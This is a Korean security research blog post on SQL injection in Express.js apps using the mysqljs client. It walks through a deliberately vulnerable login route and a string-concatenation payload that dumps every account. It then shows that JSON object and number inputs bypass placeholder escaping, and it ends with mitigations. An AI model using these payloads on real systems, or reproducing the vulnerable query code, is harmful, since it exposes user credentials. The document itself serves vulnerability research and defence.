---
layout: post
title: "Express.js + MySQL SQLi"
author: "jeong.su"
comments: true
tags: [web, node.js]
---

# Express.js + MySQL SQLi


> 2020.09
라온화이트햇 핵심연구팀 최정수
jeon95u@gmail.com

# Summary

Node.js를 위한 웹 프레인워크인 Express.js에서 MySQL를 연동하여 사용할 때 발생 할 수 있는 SQL Injection 취약점에 대해서 설명하고 Prepared statement를 적용 했을때 발생 할 수 있는 경우에 대해서 설명합니다.

# Express.js

Express.js는 Node.js를 위한 빠르고 개방적인 간결한 웹 프레임워크입니다.

[https://expressjs.com/](https://expressjs.com/)

> Fast, unopinionated, minimalist web framework for Node.js

## Install

```bash
mkdir myapp
cd myapp

npm init

npm install express --save
```

Express.js는 위와 같은 명령어를 사용해서 설치할 수 있습니다.

## Hello world

```bash
// app.js
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
	res.send('Hello World!')
})

app.listen(port, () => {
	console.log(`Example app listening at http://localhost:${port}`)
})
```

```bash
node app.js
```

Express.js는 위와 같이 간단한 코드로 웹 서비스 어플리케이션을 개발하고 실행할 수 있습니다.

# MySQL

Node.js에서 MySQL을 사용하기 위해서 JavaScript Client 라이브러리를 사용한다.

[https://github.com/mysqljs/mysql](https://github.com/mysqljs/mysql)

> A pure node.js JavaScript Client implementing the MySQL protocol.

## Install

```bash
npm install mysql
```

mysql client 라이브러리는 위와 같은 명령어를 사용해서 설치할 수 있습니다.

## Hello world

```jsx
// mysql_test.js
var mysql      = require('mysql');
var connection = mysql.createConnection({
  host     : 'localhost',
  user     : 'me',
  password : 'secret',
  database : 'my_db'
});

connection.connect();

connection.query('SELECT 1 + 1 AS solution', function (error, results, fields) {
  if (error) throw error;
  console.log('The solution is: ', results[0].solution);
});

connection.end();
```

```jsx
node mysql_test.js
```

Node.js 기반의 MySQL JavaScript client는 위 예제와 같이 사용할 수 있습니다.

# Express.js + MySQL

## Login Example

```jsx
// app.js
const express = require('express')
const app = express()
const port = 3000

const mysql = require('mysql');
const connection = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : 'autoset',
  database : 'test'
});

app.use(express.json())

app.post('/login', (req, res) => {
	connection.query('SELECT * FROM user WHERE id = "' + req.body.id + '"', function (error, results, fields) {
		if (error) throw error;
		res.send(results);
	});
})

app.listen(port, () => {
	console.log(`Example app listening at http://localhost:${port}`)
})
```

Express.js + MySQL를 사용해서 login을 간단히 구현한 예제입니다.

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Length: 14
content-type: application/json

{"id":"guest"}
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 29
Date: Tue, 29 Sep 2020 12:15:56 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"guest","pw":"guest"}]
```

정상적인 사용을 했을 때의 요청(Request)과 응답(Response)입니다.

`id`로 `guest`를 요청 했을 때 `guest` 계정의 `id`와 `pw`를 정상적으로 불러오는 것을 확인할 수 있습니다.

## SQLi 취약점

여러분은 `Login Example`인 `app.js` 코드에서 취약한 부분을 발견 하셨나요?

```jsx
'SELECT * FROM user WHERE id = "' + req.body.id + '"'
```

`connection.query`의 첫 번째 인자로 SQL Query가 넘어가는데 위와 같이 문자열을 그대로 이어 붙이기 때문에 SQLi 취약점이 발생하게 됩니다.

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 19
Pragma: no-cache

{"id":"\" || 1-- "}
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 160
Date: Tue, 29 Sep 2020 12:22:35 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"},{"id":"1test","pw":"pw"},{"id":"12test","pw":"pw"},{"id":"2test","pw":"pw"},{"id":"123test","pw":"pw"}]
```

SQLi 공격을 했을 때의 요청(Request)과 응답(Response)입니다.

`id`에 `" || 1--` 값이 들어갔기 때문에 최종적으로 `SELECT * FROM user WHERE id = "" || 1-- "` 

쿼리문이 만들어졌고 모든 Row를 리턴하게 되었습니다.

![/assets/2020-10-01/202010_soo.png](/assets/2020-10-01/202010_soo.png)

<center><b>MySQL Query Log</b></center>

MySQL Query Log를 통해서도 실제로 Injection에 성공한 것을 알 수 있습니다.

## SQL Prepared Statement

위와 같은 SQLi 취약점을 방지하기 위해서 MySQL JavaScript Client에서 `Prepared Statement` 기능이 존재합니다. 쉽게 말해서 SQL 쿼리를 만들 때 인자를 알아서 escape 처리하여 SQLi 취약점이 발생하지 않도록 만들어 줍니다.

그러면 위에서 다루었던 로그인 예제 코드에 Prepared Statement를 적용 해볼까요?

```jsx
// app.js
const express = require('express')
const app = express()
const port = 3000

const mysql = require('mysql');
const connection = mysql.createConnection({
  host     : 'localhost',
  user     : 'root',
  password : 'autoset',
  database : 'test'
});

app.use(express.json())

app.post('/login', (req, res) => {
	connection.query('SELECT * FROM user WHERE id = ?', req.body.id, function (error, results, fields) {
		if (error) throw error;
		res.send(results);
	});
})

app.listen(port, () => {
	console.log(`Example app listening at http://localhost:${port}`)
})
```

```jsx
connection.query('SELECT * FROM user WHERE id = "' + req.body.id + '"',
```

```jsx
connection.query('SELECT * FROM user WHERE id = ?', req.body.id,
```

query문에 `?`를 사용했고 2번째 인자로 `req.body.id`를 넘겨 줌으로써 Prepared Statement를 적용했습니다. 위에 코드에서 아래 코드로 변경된 것을 확인할 수 있습니다.

원리를 살펴보고자 조금 더 자세히 분석해보면 `Connection.js`에서 `sql`, `values`를 `format`함수에 넣어 줍니다.

```jsx
// node_modules/mysql/lib/Connection.js
Connection.prototype.query = function query(sql, values, cb) {
  var query = Connection.createQuery(sql, values, cb);
  query._connection = this;

  if (!(typeof sql === 'object' && 'typeCast' in sql)) {
    query.typeCast = this.config.typeCast;
  }

  if (query.sql) {
    query.sql = this.format(query.sql, query.values);
  }

  if (query._callback) {
    query._callback = wrapCallbackInDomain(this, query._callback);
  }

  this._implyConnect();

  return this._protocol._enqueue(query);
};
```

```jsx
// node_modules/mysql/index.js
exports.format = function format(sql, values, stringifyObjects, timeZone) {
  var SqlString = loadClass('SqlString');

  return SqlString.format(sql, values, stringifyObjects, timeZone);
};
```

`format` 함수는 `sqlstring`을 사용하는 것을 알 수 있습니다.

```jsx
SqlString.format = function format(sql, values, stringifyObjects, timeZone) {
  if (values == null) {
    return sql;
  }

  if (!(values instanceof Array || Array.isArray(values))) {
    values = [values];
  }

  var chunkIndex        = 0;
  var placeholdersRegex = /\?+/g;
  var result            = '';
  var valuesIndex       = 0;
  var match;

  while (valuesIndex < values.length && (match = placeholdersRegex.exec(sql))) {
    var len = match[0].length;

    if (len > 2) {
      continue;
    }

    var value = len === 2
      ? SqlString.escapeId(values[valuesIndex])
      : SqlString.escape(values[valuesIndex], stringifyObjects, timeZone);

    result += sql.slice(chunkIndex, match.index) + value;
    chunkIndex = placeholdersRegex.lastIndex;
    valuesIndex++;
  }

  if (chunkIndex === 0) {
    // Nothing was replaced
    return sql;
  }

  if (chunkIndex < sql.length) {
    return result + sql.slice(chunkIndex);
  }

  return result;
};
```

`SqlString.format` 함수는 내부에서 `escape` 함수를 통해 SQL문을 escape 해주는 것을 알 수 있습니다. 

이제 원리를 알았으니 그러면 위에서 SQLi 공격을 하는 똑같은 요청을 보냈을 때 어떻게 될까요?

예상 하신대로 `실패!` 입니다.

어떤 일이 벌어졌는지 MySQL Query Log를 살펴볼까요?

![/assets/2020-10-01/202010_soo1.png](/assets/2020-10-01/202010_soo1.png)

<center><b>MySQL Query Log</b></center>

같은 요청을 보냈지만 `"`가 escape 처리 되면서 Query가 아닌 문자열로 취급되기 때문에 Injection이 발생하지 않았습니다.

즉 `Prepared Statement`를 사용함으로써 사용자가 입력한 Input을 쿼리로 사용하는 일은 없어졌어요!

## 또 다시 SQLi

그럼 이제 안전할까요? 안전했다면 저는 이 글을 쓰고 있지 않았을 거예요 :) 

아주 제한적인 SQLi를 할 수 있습니다 😂😂😂

`Express.js`에서는 JSON Type으로 입력을 받을 수 있고 `res.body.id`에 JSON Type의 Object를 넣어 줄 수 있습니다. 일반적인 상황에서는 `Prepared Statement`를 사용함으로써 대부분의 SQLi 취약점에 대응할 수 있지만  Object를 넣을 수 있는 상황에서는 또 얘기가 달라집니다. 🤔🤔🤔

`SqlString.escape` 함수에 Object가 들어갔을때 어떻게 되는지에 대한 예시는 아래의 URL에 정리가 잘되어 있습니다. 참고해주세요.

[mysqljs/mysql](https://github.com/mysqljs/mysql/blob/ad014c82b2cbaf47acae1cc39e5533d3cb6eb882/test/unit/protocol/test-SqlString.js)

결론적으로 SQLi 취약점이 발생하는 몇가지 예시 먼저 보여 드리자면 아래와 같습니다.

### Case 1

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json

{"id":0}
```

![/assets/2020-10-01/202010_soo2.png](/assets/2020-10-01/202010_soo2.png)

<center><b>MySQL Query Log</b></center>

MySQL Query Log를 살펴보면 위와 같습니다. 어떤 일이 벌어질까요?

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 57
Date: Tue, 29 Sep 2020 13:08:36 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"}]
```

서버로 부터 위와 같은 응답이 왔습니다.

이유를 설명 드리자면 MySQL의 id는 text Type입니다. 0인 int형 숫자와 비교했기 때문에 숫자로 시작하는 id가 아닌 `admin`, `guest`의 결과 값을 확인할 수 있게 됩니다.

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json

{"id":[0]}
```

위와 같이 `{"id":[0]}`은 `{"id":0}`과 똑같은 결과가 돌아옵니다.

그렇다면 0이 아닌 다른 숫자를 입력 했을 땐 어떤 결과를 나올까요?

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 8
Pragma: no-cache

{"id":1}
```

![/assets/2020-10-01/202010_soo3.png](/assets/2020-10-01/202010_soo3.png)

<center><b>MySQL Query Log</b></center>
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 26
Date: Tue, 29 Sep 2020 13:13:15 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"1test","pw":"pw"}]
```

1을 넣으면 위와 같은 이유(text와 int의 비교)로 1로 시작하는 계정인 `1test`가 돌아옵니다. 

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 8
Pragma: no-cache

{"id":2}
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 26
ETag: W/"1a-RTcXGpGSUcZVtJ0k1TC9IOCdYLg"
Date: Tue, 29 Sep 2020 13:13:18 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"2test","pw":"pw"}]
```

2을 넣으면 위와 같은 이유(text와 int의 비교)로 2로 시작하는 계정인 `2test`가 돌아옵니다. 

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 10
Pragma: no-cache

{"id":123}
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 28
ETag: W/"1c-zKsnpl5rZNcQDMNwS5q2y5F0oEs"
Date: Tue, 29 Sep 2020 13:13:20 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"123test","pw":"pw"}]
```

123을 넣으면 위와 같은 이유(text와 int의 비교)로 123으로 시작하는 계정인 `123test`가 돌아옵니다. 

**계정의 전체 ID를 모르는 상황에서 숫자로 시작하는 계정에 접근하거나 맨 위(idx가 가장 낮은)에 있는 Row에 접근할 수 있게 됩니다.**

### Case 2

```
POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json

{"id":{"id":"1"}}
```

이번에는 위와 같은 요청을 보내 보겠습니다.

`{"id":"1"}`는 escape 함수를 통해서 ``id` = '1'`와 같이 치환됩니다. 그러면 실제로 어떤 일이 일어날까요?

MySQL Query Log를 살펴봅시다!

![/assets/2020-10-01/202010_soo4.png](/assets/2020-10-01/202010_soo4.png)

<center><b>MySQL Query Log</b></center>

세상에... 🤦‍♂️🤦‍♂️🤦‍♂️

저런 Query문이라면 injection을 통해 1=1을 만든 결과와 다를 게 없겠는데요?

네, 맞습니다!!!

column 명을 알고 있는 경우 위와 같은 Injection이 가능하게 됩니다!

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 160
Date: Tue, 29 Sep 2020 13:21:20 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"},{"id":"1test","pw":"pw"},{"id":"12test","pw":"pw"},{"id":"2test","pw":"pw"},{"id":"123test","pw":"pw"}]
```

실제로 서버에서 온 응답을 살펴보면 모든 Row를 받아온 것을 확인할 수 있습니다.

또한 위 방법으로 column 이름을 Brute Force 공격을 통해 알아낼 수 도 있습니다.

이 외에도 Object가 직접 query 함수의 입력 값으로 들어갈 수 있기 때문에 다양한 취약점이 발생 될 것이라고 생각됩니다. 다른 경우들은 앞으로 연구해야 할 필요가 있을것 같아요.

## 대응 방안

그러면 어떻게 대응 할 수 있을까요?

Query에 Object가 직접 들어가기 때문에 발생한 문제였으니깐 toString() 함수를 사용해서 해결 할 수 있습니다.

또한 Prepared Statement에서 `??` 물음표를 2개 사용하게 되면 내부적으로 toString 함수가 적용되어 위 취약점에 대응할 수 있습니다.

toString()을 적용하게 되면 아래와 같이 Object가 문자열로 들어가게 됩니다!

![/assets/2020-10-01/202010_soo5.png](/assets/2020-10-01/202010_soo5.png)

# 마무리

이번에는 Express.js + MySQL을 사용할 때 발생할 수 있는 SQLi 취약점과 Prepared Statement를 적용 했을 때도 SQLi 취약점이 발생할 수 있다는 내용을 살펴봤습니다.

Prepared Statement를 사용하면 무조건 안전 할 것이다, escape 함수에 0-day 취약점이 존재하지 않는다면 안전할 것이라고 생각했던 `생각의 틀`을 깨 주었던 연구였습니다.

여러분 모두 고정적인 사고를 벗어나 취약점을 찾아봅시다. 😂